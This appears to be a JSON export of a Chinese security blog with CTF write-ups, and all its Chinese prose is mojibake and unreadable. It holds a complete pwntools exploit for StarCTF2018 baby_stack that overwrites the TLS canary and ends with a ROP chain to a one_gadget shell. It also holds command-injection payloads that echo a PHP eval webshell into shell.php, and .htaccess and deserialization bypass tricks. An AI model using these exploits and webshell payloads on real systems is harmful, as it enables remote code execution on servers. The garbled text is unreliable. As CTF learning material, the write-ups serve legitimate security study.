{"pages":[],"posts":[{"title":"ç»•è¿‡Canaryçš„å…¶ä»–å§¿åŠ¿ StarCTF2018 baby_stack","text":"ä½œè€…ï¼šLordRiot emmmmä»Šå¤©æŠŠæ‰‹æœºæ‘”åå¯¼è‡´å¾ˆä¸çˆ½ï¼Œäºæ˜¯æäº†å¥½å‡ ä¸ªå°æ—¶è¿™ä¸ªé¢˜ï¼Œæœ€åå‘ç°è‡ªå·±æ˜¯ä¸ªrz orzStarCTF2018 baby_stackä»Šå¤©ç­‰ä¿®æ‰‹æœºçš„æ—¶å€™æƒ³èµ·æ˜¨å¤©çœ‹åˆ°ichunqiuæ–°æ˜¥æˆ˜å½¹çš„BFnoteé‡Œåˆ©ç”¨è¦†å†™TLSç»“æ„ä½“bypassäº†canaryï¼Œäºæ˜¯å°±å¾ˆå¥½å¥‡å…¶å…·ä½“åŸç†ï¼ŒæŸ¥äº†ä¸€æ³¢å‘ç°ï¼Œé‚£ä¸€é¢˜æ˜¯åˆ©ç”¨libc2.23çš„ç‰¹æ®Šæœºåˆ¶è¦†å†™äº†mainçº¿ç¨‹çš„TLSï¼Œç„¶åæ‰¾åˆ°å¦ä¸€ä¸ªè¦†å†™TLSç»“æ„ä½“çš„é¢˜ï¼Œå³æ˜¯æœ¬é¢˜ï¼Œä¸è¿‡ä¸åŒçš„æ˜¯ï¼Œæœ¬é¢˜ç›´æ¥åˆ©ç”¨pthread_createå‡½æ•°ï¼ŒåŠ äº†ä¸ªçº¿ç¨‹å‡ºæ¥ï¼Œç„¶åç”±äºè¯¥çº¿ç¨‹çš„æ ˆåœ¨å…¶TLSç»“æ„ä½“ä¹‹ä¸Šï¼Œæ‰€ä»¥å¯ä»¥è¦†å†™æˆåŠŸã€‚ è¿™ä¸€é¢˜æ˜¯æˆ‘çŸ¥é“åŸç†ä¹‹åçº¯åŠ¨è°ƒåšçš„orzï¼Œå°±å…ˆæ‰“ä¸ªæ–­ç‚¹ï¼Œåº·åº·canaryçš„å€¼ï¼Œä¹‹åè·Ÿè¿›ï¼Œç›´æ¥find canaryï¼ŒæŸ¥åˆ°å…¶åœ¨å†…å­˜ä¸­çš„æ‰€æœ‰ä½ç½®ï¼Œå‘ç°æœ‰å››å¤„ï¼Œå…¶ä¸­ä¸€å¤„æ˜¯åœ¨mainçº¿ç¨‹çš„TLSï¼Œä¸¤å¤„æ˜¯åœ¨æ–°çº¿ç¨‹çš„æ ˆï¼Œä¸€å¤„æ˜¯åœ¨æ–°çº¿ç¨‹çš„TLSç»“æ„ï¼Œç„¶åç®—å‡ºåç§»ï¼Œç›´æ¥å…¨éƒ¨è¦†å†™æˆâ€™\\x00â€™ï¼Œç„¶åç”±äºæ”¹äº†TLSï¼ˆTLSç»“æ„ä½“é‡Œæœ¬èº«æœ‰äº›éšæœºçš„é‡ï¼Œä¾‹å¦‚ä¸€äº›åœ¨libcä¸Šçš„åœ°å€ä»€ä¹ˆçš„ï¼Œç¬¬ä¸€æ¬¡è¦†å†™è‚¯å®šæ— æ³•ä¿æŒï¼Œåªèƒ½å…¨è¦†å†™æˆ0äº†ï¼‰ï¼Œæ‰€ä»¥éœ€è¦æ ˆè¿ç§»ä¸€ä¸‹ï¼Œå°±read payloadåˆ°æ–°æ ˆï¼Œç„¶ååŠ«æŒæ ˆåˆ°æ–°æ ˆå³å¯ï¼Œç„¶åä¼¼ä¹æ˜¯ç”±äºpayloadé•¿åº¦çš„å…³ç³»ï¼Œæˆ‘ä¸€åº¦æƒ³å†™â€™/bin/sh\\x00â€™ï¼Œç„¶åcall systemæ¥getshellï¼Œä½†æ˜¯å§‹ç»ˆä¸è¡Œï¼ŒåŠ¨è°ƒäº†ä¿©å°æ—¶ï¼Œæ¯«æ— èµ·è‰²ï¼Œç”šè‡³æˆ‘éƒ½è·Ÿç€systemæºç å•æ­¥è°ƒè¯•äº†ï¼Œå‘ç°ä¼¼ä¹æ˜¯payloadçš„æŸä¸ªåœ°æ–¹çš„è¦†å†™å¯¼è‡´çš„ï¼Œç„¶åæ¢æˆäº†one_gadgetï¼Œä¸€æ¢­æå®šï¼Œorzï¼ŒåŸåœ°è‡ªé—­ï¼Œä¸‹é¢è´´ä¸€ä¸‹expã€‚ï¼ˆone_gadget æˆ‘ç›´æ¥ç”¨çš„æœ¬åœ°çš„ï¼Œæ˜¯2.27çš„ï¼Œæ‰“è¿œç¨‹çš„è¯ï¼Œç¬¬ä¸€æ¬¡leakå‡ºç‰ˆæœ¬å†è·å–ä¸€æ ·çš„ï¼‰ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081p = process('./baby_stack')puts_plt = 0x4006F0read_got = 0x601FD0puts_got = 0x601FB0new_stack = 0x602400init_pop = 0x400B6Ainit_mov = 0x400B50pop_rdi = 0x400b73pop_rbp = 0x4007d8leave = 0x4008a6fake_canary = '\\x00' * 8first_offset = 0xB0second_offset = 0x820fake_TLS = p64(0x603270)fake_TLS += p64(0)fake_TLS += p64(1)fake_TLS += p64(0)fake_TLS += fake_canaryrop_chain = p64(init_pop)rop_chain += p64(0)rop_chain += p64(1)rop_chain += p64(read_got)rop_chain += p64(0)rop_chain += p64(new_stack)rop_chain += p64(0x400)rop_chain += p64(init_mov)rop_chain += '\\x00' * 0x38rop_chain += p64(pop_rbp)rop_chain += p64(new_stack - 8)rop_chain += p64(leave)payload = '\\x00' * 0x101bpayload += rop_chainpayload += '\\x00' * (second_offset - 16 - len(rop_chain))payload += fake_TLSp.recvuntil('How many bytes do you want to send?')p.send(str(len(payload)))sleep(1)p.send(payload)sleep(1)p.send('\\x00' * 3)rop_chain = p64(init_pop)rop_chain += p64(0)rop_chain += p64(1)rop_chain += p64(read_got)rop_chain += p64(0)rop_chain += p64(new_stack + 0x400)rop_chain += p64(0x400)rop_chain += p64(init_mov)rop_chain += '\\x00' * 0x38rop_chain += p64(pop_rbp)rop_chain += p64(new_stack + 0x400 - 8)rop_chain += p64(leave)payload = p64(pop_rdi)payload += p64(puts_got)payload += p64(puts_plt)payload += rop_chainp.recvuntil('It\\'s time to say goodbye.')p.send(payload)p.recvline()puts_addr = u64(p.recv(6).ljust(8, '\\x00'))obj = LibcSearcher('puts', puts_addr)base_addr = puts_addr - obj.dump('puts')one_gadget = 0x4f322 + base_addrsleep(1)p.send(p64(one_gadget))p.interactive() æœ¬æ¥è¿˜æƒ³æ°´ä¸€æœŸæ ˆè¿ç§»å’ŒSROPçš„åšå®¢ï¼Œä½†æœ€è¿‘äº‹æƒ…å¤ªå¤šäº†ï¼Œè¿˜è¦èµ¶ç´§å­¦å †ï¼Œå°±å…ˆé¸½äº†ï¼Œä»¥åæœ‰æ—¶é—´æŠŠreturn to VDSOå’ŒSROPä¸€å—å†™äº†: - )","link":"/2020/02/20/StarCTF2018%20baby_stack/"},{"title":"CTFhub RCEç³»åˆ—","text":"ä»Šå¤©ä»‹ç»è¿œç¨‹æ‰§è¡Œæ¼æ´ï¼ˆå…¶å®æƒ³å­¦åå¼¹shellã€‚ é¦–å…ˆéœ€è¦æŒæ¡å‡ ç§å¸¸è§çš„è¯­å¥ã€‚ 1ã€| ï¼Œ&amp; ï¼Œ&amp;&amp;ï¼Œ||ç­‰æ“ä½œ ï¼ˆ1ï¼‰&amp; è¡¨ç¤ºå…ˆæ‰§è¡ŒCMD1 å†æ‰§è¡ŒCMD2ï¼Œè¿™é‡Œä¸è€ƒè™‘CMD1æ˜¯å¦æˆåŠŸã€‚ä½¿ç”¨CMD1 &amp; CMD2 ï¼ˆ2ï¼‰&amp;&amp; è¡¨ç¤ºå…ˆæ‰§è¡ŒCMD1ï¼ŒæˆåŠŸåå†æ‰§è¡ŒCMDï¼Œå¦åˆ™ä¸æ‰§è¡ŒCMD2ã€‚ä½¿ç”¨CMD1 &amp;&amp; CMD2 ï¼ˆ3ï¼‰|| å…ˆæ‰§è¡ŒCMD1ï¼ŒCMD1æ‰§è¡ŒæˆåŠŸå°±ä¸å†æ‰§è¡ŒCMD2ï¼ŒCMD1æ‰§è¡Œå¤±è´¥åˆ™æ‰§è¡ŒCMD2ã€‚ä½¿ç”¨CMD1 || CMD2 2ã€payloadï¼ˆ&amp; / â€˜ â€œ ç©ºæ ¼ç­‰ç‰¹æ®Šç¬¦å·éœ€è¦æ—¶ç¼–ç ï¼‰ (1) cmd = 127.0.0.1 | whoami (2) cmd = 127.0.0.1 &amp; whoami (3) cmd = 127.0.0.1 &amp;&amp; whoami (4) cmd = `whoami` (5) cmd = &apos;/&quot;|whoamiï¼ˆè¿™é‡Œæ„æ€æ˜¯ç”¨&apos;/&quot;å¼•å·é—­åˆå‰é¢ /-&gt;è¡¨ç¤ºæˆ–ï¼‰ 3ã€å¸¸ç”¨çš„å‘½ä»¤ ï¼ˆ1ï¼‰ æœ‰å›æ˜¾çš„ï¼šwhoami idï¼ˆéªŒè¯ç±»ï¼‰ (2) æ²¡æœ‰å›æ˜¾çš„ï¼šnslookup wget ç­‰çœ‹è¯·æ±‚ã€dnslog httplogç­‰ ï¼ˆéªŒè¯ç±»ï¼‰ ï¼ˆ3ï¼‰å¼¹shellå¿…é¡»çš„ï¼Œå‚è€ƒæˆ‘è‡ªå·±çš„ï¼ˆhttp://www.cnblogs.com/KevinGeorge/p/8120226.htmlï¼‰ â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”ç‰ˆæƒå£°æ˜ï¼šæœ¬æ–‡ä¸ºCSDNåšä¸»ã€Œiamsongyuã€çš„åŸåˆ›æ–‡ç« ï¼Œéµå¾ª CC 4.0 BY-SA ç‰ˆæƒåè®®ï¼Œè½¬è½½è¯·é™„ä¸ŠåŸæ–‡å‡ºå¤„é“¾æ¥åŠæœ¬å£°æ˜ã€‚åŸæ–‡é“¾æ¥ï¼šhttps://blog.csdn.net/iamsongyu/article/details/84483638 ç¬¬ä¸€å…³æ²¡æœ‰ä»»ä½•è¿‡æ»¤127.0.0.1|ls127.0.0.1|cat ```.phpF12çœ‹æºç ã€‚ ç¬¬äºŒå…³ è¿‡æ»¤æ‰äº†catè¿˜æ˜¯å…ˆçœ‹127.0.0.1|ls127.0.0.1|câ€™aâ€™t flag_110451125822562.phpF12å‡ºflagä¸Šè¿°æ˜¯ä¸€ç§æ–¹æ³•è¿˜æœ‰ä¸€ç§å¯ä»¥ä¼ ä¸€å¥è¯æœ¨é©¬ 1127.0.0.1|echo &quot;&lt;?php @eval(\\$_POST['a']);?&gt;&quot; &gt;&gt; shell.php è¿shellå°±ä¸å±•ç¤ºäº† ç¬¬ä¸‰å…³ è¿‡æ»¤ç©ºæ ¼127.0.0.1|lsæˆ‘è¿™é‡Œæ˜¯è¿ç”¨äº†${IFS}æ¥ç»•è¿‡äº†ç©ºæ ¼ï¼Œæˆ‘å°è¯•äº†æ‹¬å·å’Œurlç¼–ç æ— æœï¼Œè€ƒè™‘ä½¿ç”¨äº†${IFS} 1127.0.0.1|cat${IFS}flag_518528200601.php ä¾ç„¶F12çœ‹æºç å¾—åˆ°flag ç¬¬å››å…³ è¿‡æ»¤ç›®å½•åˆ†éš”ç¬¦ç›®å½•åˆ†å‰²ç¬¦é€šå¸¸æ˜¯â€™'æˆ–è€…æ˜¯â€™/â€˜ä¸¤è€…åœ¨pythonä¸­éƒ½å¯ç”¨ã€‚é‚£ä¹ˆå°±ç”¨åˆ†å·ç±»ä¼¼å †å æ³¨å…¥ä¸€æ ·æ¯ä¸ªè¯­å¥ååŠ åˆ†å·127.0.0.1;ls 1127.0.0.1;cd flag_is_here;ls è€å¥—è·¯ ç¬¬äº”å…³ è¿‡æ»¤è¿ç®—ç¬¦åŒä¸Šå…³å°±å¯ã€‚è¿™è®©æˆ‘æƒ³åˆ°äº†æ˜¯ä¸æ˜¯ä¸Šä¸€å…³æœ‰å…¶ä»–æ–¹æ³•ã€‚æˆ‘å»æœç´¢äº†ä¸‹ã€‚å¾—åˆ°ç»“æœå…¶ä»–äººä¹Ÿæ˜¯è¿™ä¹ˆåšçš„ã€‚å»æœç´¢äº†æœ‰æ²¡æœ‰åˆ†å·è¿‡æ»¤ä»¥åŠç»•è¿‡æ²¡æœ‰å¾—åˆ°ä»€ä¹ˆç»“æœï¼ˆä»¥åå¡«å‘ï¼‰ç¬¬å…­å…³å°±å¡«å‘äº†ã€‚ ç¬¬å…­å…³ ä»¥ä¸Šæ‰€æœ‰å…³å…¨éƒ¨è¿‡æ»¤éš¾é“ä¸æ˜¯ç¬¬äºŒå…³+ç¬¬ä¸‰å…³+ç¬¬å››å…³å°±ç»“æŸäº†ï¼Ÿå¥½å§ï¼Œçœ‹åˆ°é¢˜ç¡®å®ä¸æ˜¯hhhã€‚æ¯•ç«Ÿæ˜¯æœ€åä¸€ä¸ªäº†ï¼Œç»™å¤§å®¶åˆ†æä¸€ä¸‹å§é¦–å…ˆè¿‡æ»¤äº†åŸºæœ¬ä¸Šé¢æˆ‘æ‰€ç”¨è¿‡çš„æ‰€æœ‰å‘½ä»¤åˆ†éš”ç¬¦ã€‚é‚£ä¹ˆåœ¨è¿™é‡Œä»‹ç»ä¸€ä¸‹å¦å¤–ä¸¤ç§åˆ†éš”ç¬¦%0a(æ¢è¡Œç¬¦) ã€%0d(å›è½¦ç¬¦)ï¼Œå¹¶ä¸”åœ¨urlä¸‹å†™å…¥ 1?ip=127.0.0.1%0Als# æ³¨æ„åªèƒ½åœ¨urlå†™ï¼Œå¦åˆ™ä¼šè¢«äºŒæ¬¡ç¼–ç å¯¼è‡´å¤±æ•ˆã€‚é‚£ä¹ˆå°±ç»§ç»­ä¸‹ä¸€æ­¥ã€‚ 1ip=127.0.0.1%0acd${IFS}'f'lag_is_here%0als# æœ€åä¸€æŠŠæ¢­ 1ip=127.0.0.1%0acd${IFS}'f'lag_is_here%0a'c'at${IFS}'f'lag_256432033625740.php# åˆ°æ­¤å°±ç»“æŸä¸€æ®µäº†23333","link":"/2020/03/18/ctfhub-RCE/"},{"title":"PHPç§¯ç´¯","text":"php ä¸‰ç§å†™æ³•1234567&lt;? echo (&quot;è¿™æ˜¯ä¸€ä¸ª PHP è¯­è¨€çš„åµŒå…¥èŒƒä¾‹\\n&quot;); ?&gt;&lt;?php echo(&quot;è¿™æ˜¯ç¬¬äºŒä¸ª PHP è¯­è¨€çš„åµŒå…¥èŒƒä¾‹\\n&quot;); ?&gt;&lt;script language=&quot;php&quot;&gt; echo (&quot;è¿™æ˜¯ç±»ä¼¼ JavaScript åŠ VBScript è¯­æ³•çš„ PHP è¯­è¨€åµŒå…¥èŒƒä¾‹&quot;);&lt;/script&gt;&lt;% echo (&quot;è¿™æ˜¯ç±»ä¼¼ ASP åµŒå…¥è¯­æ³•çš„ PHP èŒƒä¾‹&quot;); %&gt; php://filterç®€å•ç†è§£ï¼š php://filter æ˜¯phpä¸­ç‹¬æœ‰çš„ä¸€ä¸ªåè®®ï¼Œå¯ä»¥ä½œä¸ºä¸€ä¸ªä¸­é—´æµæ¥å¤„ç†å…¶ä»–æµï¼Œå¯ä»¥è¿›è¡Œä»»æ„æ–‡ä»¶çš„è¯»å–ï¼›æ ¹æ®åå­—ï¼Œfilterï¼Œå¯ä»¥å¾ˆå®¹æ˜“æƒ³åˆ°è¿™ä¸ªåè®®å¯ä»¥ç”¨æ¥è¿‡æ»¤ä¸€äº›ä¸œè¥¿ï¼› ä½¿ç”¨ä¸åŒçš„å‚æ•°å¯ä»¥è¾¾åˆ°ä¸åŒçš„ç›®çš„å’Œæ•ˆæœï¼š åç§° æè¿° å¤‡æ³¨ resource=&lt;è¦è¿‡æ»¤çš„æ•°æ®æµ&gt; æŒ‡å®šäº†ä½ è¦ç­›é€‰è¿‡æ»¤çš„æ•°æ®æµ å¿…é€‰ read=&lt;è¯»é“¾çš„ç­›é€‰åˆ—è¡¨&gt; å¯ä»¥è®¾å®šä¸€ä¸ªæˆ–å¤šä¸ªè¿‡æ»¤å™¨åç§°ï¼Œä»¥ç®¡é“ç¬¦â€|â€åˆ†å‰² å¯é€‰ write=&lt;å†™é“¾çš„ç­›é€‰åˆ—è¡¨&gt; å¯ä»¥è®¾å®šä¸€ä¸ªæˆ–å¤šä¸ªè¿‡æ»¤å™¨åç§°ï¼Œä»¥ç®¡é“ç¬¦â€|â€œåˆ†å‰² å¯é€‰ &lt;ï¼›ä¸¤ä¸ªé“¾çš„ç­›é€‰åˆ—è¡¨&gt; ä»»ä½•æ²¡æœ‰ä»¥ read= æˆ– write= ä½œå‰ç¼€ çš„ç­›é€‰å™¨åˆ—è¡¨ä¼šè§†æƒ…å†µåº”ç”¨äºè¯»æˆ–å†™é“¾ã€‚ ååºåˆ—åŒ–é­”æœ¯æ–¹æ³•123456789__construct()//å½“ä¸€ä¸ªå¯¹è±¡åˆ›å»ºæ—¶è¢«è°ƒç”¨__destruct() //å½“ä¸€ä¸ªå¯¹è±¡é”€æ¯æ—¶è¢«è°ƒç”¨__toString() //å½“ä¸€ä¸ªå¯¹è±¡è¢«å½“ä½œä¸€ä¸ªå­—ç¬¦ä¸²ä½¿ç”¨__sleep()//åœ¨å¯¹è±¡åœ¨è¢«åºåˆ—åŒ–ä¹‹å‰è¿è¡Œ__wakeup()//å°†åœ¨ååºåˆ—åŒ–ä¹‹åç«‹å³è¢«è°ƒç”¨(é€šè¿‡åºåˆ—åŒ–å¯¹è±¡å…ƒç´ ä¸ªæ•°ä¸ç¬¦æ¥ç»•è¿‡)__get()//è·å¾—ä¸€ä¸ªç±»çš„æˆå‘˜å˜é‡æ—¶è°ƒç”¨__set()//è®¾ç½®ä¸€ä¸ªç±»çš„æˆå‘˜å˜é‡æ—¶è°ƒç”¨__invoke()//è°ƒç”¨å‡½æ•°çš„æ–¹å¼è°ƒç”¨ä¸€ä¸ªå¯¹è±¡æ—¶çš„å›åº”æ–¹æ³•__call()//å½“è°ƒç”¨ä¸€ä¸ªå¯¹è±¡ä¸­çš„ä¸èƒ½ç”¨çš„æ–¹æ³•çš„æ—¶å€™å°±ä¼šæ‰§è¡Œè¿™ä¸ªå‡½æ•° publicã€protectedä¸privateåœ¨åºåˆ—åŒ–æ—¶çš„åŒºåˆ«protected å£°æ˜çš„å­—æ®µä¸ºä¿æŠ¤å­—æ®µï¼Œåœ¨æ‰€å£°æ˜çš„ç±»å’Œè¯¥ç±»çš„å­ç±»ä¸­å¯è§ï¼Œä½†åœ¨è¯¥ç±»çš„å¯¹è±¡å®ä¾‹ä¸­ä¸å¯è§ã€‚å› æ­¤ä¿æŠ¤å­—æ®µçš„å­—æ®µååœ¨åºåˆ—åŒ–æ—¶ï¼Œå­—æ®µåå‰é¢ä¼šåŠ ä¸Š\\0\\0çš„å‰ç¼€ã€‚è¿™é‡Œçš„ \\0 è¡¨ç¤º ASCII ç ä¸º 0 çš„å­—ç¬¦(ä¸å¯è§å­—ç¬¦)ï¼Œè€Œä¸æ˜¯ \\0 ç»„åˆã€‚è¿™ä¹Ÿè®¸è§£é‡Šäº†ï¼Œä¸ºä»€ä¹ˆå¦‚æœç›´æ¥åœ¨ç½‘å€ä¸Šï¼Œä¼ é€’\\0\\0usernameä¼šæŠ¥é”™ï¼Œå› ä¸ºå®é™…ä¸Šå¹¶ä¸æ˜¯\\0ï¼Œåªæ˜¯ç”¨å®ƒæ¥ä»£æ›¿ASCIIå€¼ä¸º0çš„å­—ç¬¦ã€‚å¿…é¡»ç”¨pythonä¼ å€¼æ‰å¯ä»¥ã€‚ 123456789101112131415161718&lt;?phpclass Name{ protected $username = 'nonono'; protected $password = 'yesyes'; public function __construct($username,$password){ $this-&gt;username = $username; $this-&gt;password = $password; } public function __wakeup(){ $this-&gt;username = \"guests\"; } public function fun(){ echo $this-&gt;username;echo \"&lt;br&gt;\";echo $this-&gt;password; }}$a = serialize(new Name(\"admin\",100));echo $a;?&gt; 1O:4:&quot;Name&quot;:2:{s:11:&quot;\\0*\\0username&quot;;s:5:&quot;admin&quot;;s:11:&quot;\\0*\\0password&quot;;i:100;} private å£°æ˜çš„å­—æ®µä¸ºç§æœ‰å­—æ®µï¼Œåªåœ¨æ‰€å£°æ˜çš„ç±»ä¸­å¯è§ï¼Œåœ¨è¯¥ç±»çš„å­ç±»å’Œè¯¥ç±»çš„å¯¹è±¡å®ä¾‹ä¸­å‡ä¸å¯è§ã€‚å› æ­¤ç§æœ‰å­—æ®µçš„å­—æ®µååœ¨åºåˆ—åŒ–æ—¶ï¼Œç±»åå’Œå­—æ®µåå‰é¢éƒ½ä¼šåŠ ä¸Š\\0çš„å‰ç¼€ã€‚å­—ç¬¦ä¸²é•¿åº¦ä¹ŸåŒ…æ‹¬æ‰€åŠ å‰ç¼€çš„é•¿åº¦ã€‚å…¶ä¸­ \\0 å­—ç¬¦ä¹Ÿæ˜¯è®¡ç®—é•¿åº¦çš„ã€‚ å¯ä»¥ä¸çœ‹ï¼šè¿™é‡Œ è¡¨ç¤ºçš„æ˜¯å£°æ˜è¯¥ç§æœ‰å­—æ®µçš„ç±»çš„ç±»åï¼Œè€Œä¸æ˜¯è¢«åºåˆ—åŒ–çš„å¯¹è±¡çš„ç±»åã€‚å› ä¸ºå£°æ˜è¯¥ç§æœ‰å­—æ®µçš„ç±»ä¸ä¸€å®šæ˜¯è¢«åºåˆ—åŒ–çš„å¯¹è±¡çš„ç±»ï¼Œè€Œæœ‰å¯èƒ½æ˜¯å®ƒçš„ç¥–å…ˆç±»ã€‚å­—æ®µåè¢«ä½œä¸ºå­—ç¬¦ä¸²åºåˆ—åŒ–æ—¶ï¼Œå­—ç¬¦ä¸²å€¼ä¸­åŒ…æ‹¬æ ¹æ®å…¶å¯è§æ€§æ‰€åŠ çš„å‰ç¼€ã€‚ 12345678910111213141516171819&lt;?phpclass Name{ private $username = 'nonono'; private $password = 'yesyes'; public function __construct($username,$password){ $this-&gt;username = $username; $this-&gt;password = $password; } public function __wakeup(){ $this-&gt;username = \"guests\"; } public function fun(){ echo $this-&gt;username;echo \"&lt;br&gt;\";echo $this-&gt;password; }}$a = serialize(new Name(\"admin\",100));echo $a;?&gt;O:4:\"Name\":2:{s:14:\"\\0Name\\0username\";s:5:\"admin\";s:14:\"\\0Name\\0password\";i:100;} 3.__wakeup()æ–¹æ³•ç»•è¿‡ä½œç”¨ï¼šä¸__sleep()å‡½æ•°ç›¸åï¼Œ__sleep()å‡½æ•°ï¼Œæ˜¯åœ¨åºåºåˆ—åŒ–æ—¶è¢«è‡ªåŠ¨è°ƒç”¨ã€‚__wakeup()å‡½æ•°ï¼Œåœ¨ååºåˆ—åŒ–æ—¶ï¼Œè¢«è‡ªåŠ¨è°ƒç”¨ã€‚ç»•è¿‡ï¼šå½“ååºåˆ—åŒ–å­—ç¬¦ä¸²ï¼Œè¡¨ç¤ºå±æ€§ä¸ªæ•°çš„å€¼å¤§äºçœŸå®å±æ€§ä¸ªæ•°æ—¶ï¼Œä¼šè·³è¿‡__wakeup å‡½æ•°çš„æ‰§è¡Œã€‚ä¸Šé¢çš„ä»£ç ï¼Œåºåˆ—åŒ–åçš„ç»“æœä¸º è¦æ±‚ï¼šPHP5 &lt; 5.6.25 PHP7 &lt; 7.0.10 1O:4:&quot;Name&quot;:2:{s:14:&quot;\\0Name\\0username&quot;;s:5:&quot;admin&quot;;s:14:&quot;\\0Name\\0password&quot;;i:100;} å…¶ä¸­nameåé¢çš„2ï¼Œä»£è¡¨ç±»ä¸­æœ‰2ä¸ªå±æ€§ï¼Œä½†å¦‚æœæˆ‘ä»¬æŠŠ2æ”¹æˆ3ï¼Œå°±ä¼šç»•è¿‡__wakeup()å‡½æ•°ã€‚ 1O:4:&quot;Name&quot;:3:{s:14:&quot;\\0Name\\0username&quot;;s:5:&quot;admin&quot;;s:14:&quot;\\0Name\\0password&quot;;i:100;} .htaccessæ–‡ä»¶åˆ©ç”¨ æ­£ç¡®è§£æç»•è¿‡ .htaccessä¸­å‡ºç°çš„æ— æ³•æ­£å¸¸è§£æçš„æ¡ç›®æ—¶æ— æ³•ç”Ÿæ•ˆ \\æ¢è¡Œç»•è¿‡è„å­—ç¬¦æˆ–ç»•WAF åˆ©ç”¨XMPå›¾ç‰‡è§£æå¤´(#åˆšå¥½æ˜¯æ³¨é‡Šç¬¦) 12#define width 1#define height 1 åˆ©ç”¨wbmpæ–‡ä»¶è§£æå¤´ 1\\x00\\x00\\x8a\\x39\\x8a\\x39 å¢åŠ ä½¿ç”¨phpè§£æçš„æ–‡ä»¶åç¼€(.jpg) 1AddType application/x-httpd-php .jpg å¢åŠ ä½¿ç”¨phpè§£æçš„æ–‡ä»¶ 123&lt;FilesMatch &quot;&lt;filename&gt;&quot;&gt;SetHandler application/x-httpd-php&lt;/FilesMatch&gt; åˆ©ç”¨php_valueæ³¨å…¥phpé…ç½® åœ¨æ‰€æœ‰phpå‰åæ³¨å…¥æ¶æ„phpæ–‡ä»¶ 12php_value auto_prepend_file &quot;&lt;FileDir&gt;&quot;php_value auto_append_file &quot;&lt;FileDir&gt;&quot; åˆ©ç”¨prceå‚æ•°ç»•è¿‡preg_match 12php_value pcre.backtrack_limit 0php_value pcre.jit 0 ä»»æ„åŒ¹é…å‡è¿”å›FALSE https://www.php.net/manual/zh/pcre.configuration.php åˆ©ç”¨UTF-7ç¼–ç ç»•è¿‡æ—¥å¿—htmlç¼–ç  12php_value zend.multibyte 1php_value zend.script_encoding &quot;UTF-7&quot; åˆ©ç”¨inclue_pathåŒ…å«æ¶æ„æ–‡ä»¶ 1php_value include_path &quot;/tmp&quot; åˆ©ç”¨error logå†™æœ¬åœ°æ–‡ä»¶ (htmlç¼–ç ) 12php_value error_log /tmp/fl3g.phpphp_value error_reporting 32767","link":"/2020/03/18/php-bypass/"},{"title":"ä»ä¸¤é“é¢˜ç›®æµ…è°ˆPHPæ·±æµ…æ‹·è´","text":"0x01 å‰è¨€æœ€è¿‘æ‰è®¤è®¤çœŸçœŸçœ‹å®ŒPHPï¼Œè™½ç„¶è¿˜æ˜¯æœ‰å¾ˆå¤šåœ°æ–¹ä¸ä¼šåº”ç”¨ï¼Œå› æ­¤æƒ³å¤šçœ‹çœ‹æœ‰å…³PHPçš„é¢˜ç›®ï¼Œçœ‹åˆ°äº†ä¸¤é“å’ŒPHPæ·±æµ…æ‹·è´æœ‰å…³çš„é¢˜ç›®ï¼Œè‡ªå·±ä¹ŸæŠŠå®ƒææ‡‚å§ã€‚ã€‚ 0x01 æ­£æ–‡é¢˜ä¸€ï¼šå—é‚®ctfçš„PHPååºåˆ—åŒ– 12345678910111213141516171819202122232425&lt;?phpclass just4fun { var $enter; var $secret;}if (isset($_GET['pass'])) { $pass = $_GET['pass']; if(get_magic_quotes_gpc()){ $pass=stripslashes($pass); } $o = unserialize($pass); if ($o) { $o-&gt;secret = \"*\"; if ($o-&gt;secret === $o-&gt;enter) echo \"Congratulation! Here is my secret: \".$o-&gt;secret; else echo \"Oh no... You can't fool me\"; } else echo \"are you trolling?\";}?&gt; é¢˜ç›®æ„å›¾å¾ˆç®€å•ï¼Œå°±æ˜¯å…ˆè®¾ç½®äº†å¯¹è±¡çš„ä¸€ä¸ªå±æ€§çš„å€¼ï¼Œå¦‚æœå¦ä¸€ä¸ªå±æ€§çš„å€¼å’Œè¿™ä¸ªè®¾ç½®å¥½çš„å€¼ç›¸ç­‰ï¼Œåˆ™å¾—åˆ°flagï¼Œè€Œget_magic_quotes_gpc()å’Œ$pass=stripslashes($pass)åªæ˜¯æŠŠåŠ ä¸Šçš„è½¬ä¹‰å­—ç¬¦åˆç»™å»æ‰ï¼Œä¼¼ä¹å¯¹è¿™ä¸ªé¢˜æ²¡æœ‰ä»€ä¹ˆå½±å“ã€‚æœ€åˆæˆ‘ä»¥ä¸º$o-&gt;secret = &quot;*&quot;å°±æ˜¯æŠŠè¿™ä¸ªå±æ€§çš„å€¼è®¾ä¸º*ï¼Œå…¶å®æ˜¯è®¾ç½®æˆäº†ä»»æ„å­—ç¬¦ï¼Œé‚£æˆ‘ä»¬å¦‚ä½•å°†è¿™ä¸ªæ»¡è¶³$o-&gt;secret === $o-&gt;enterè¿™é‡Œå°±è¦ç”¨åˆ°PHPæ·±æµ…æ‹·è´çš„çŸ¥è¯†ã€‚ æˆ‘ä»¬ä¸¾ä¸€ä¸ªæ —å­ï¼š 123456789101112131415&lt;?phpclass Example1{ public $name; public function __construct($name) { $this-&gt;name = $name; }}$ex1 = new Example('test1');// $ex1-&gt;nameç°åœ¨æ˜¯ï¼štest1$ex2 = $ex1;// $ex2-&gt;nameç°åœ¨æ˜¯ï¼štest1$ex2-&gt;name = 'test2';// è¿™æ ·ä¿®æ”¹ä¸€ä¸‹ä¹‹åï¼Œ$ex1-&gt;nameä¸$ex2-&gt;nameéƒ½å˜ä¸ºäº†ï¼štest2 ç°åœ¨æˆ‘ä»¬åº”è¯¥å¯ä»¥ç†è§£å¯¹è±¡é—´å¼•ç”¨çš„æ¦‚å¿µï¼Œä»–ä»¬å°±ç›¸å½“äºæ˜¯åŒä¸€ä¸ªç±»çš„åŒä¸€ä¸ªå¯¹è±¡ï¼ŒPHP5é»˜è®¤é€šè¿‡å¼•ç”¨ä¼ é€’å¯¹è±¡ï¼Œå‡è®¾$obj1å’Œ$obj2æ˜¯ä¸¤ä¸ªå¯¹è±¡ï¼Œä½¿ç”¨$obj1=$obj2è¿™æ ·çš„æ–¹æ³•å¤åˆ¶å‡ºçš„å¯¹è±¡æ˜¯ç›¸äº’å…³è”çš„ï¼Œç¨‹åºä¸­æƒ³å¤åˆ¶ä¸€ä¸ªå€¼ä¸åŸæ¥ç›¸åŒçš„å¯¹è±¡ï¼Œè€Œä¸å¸Œæœ›ç›®æ 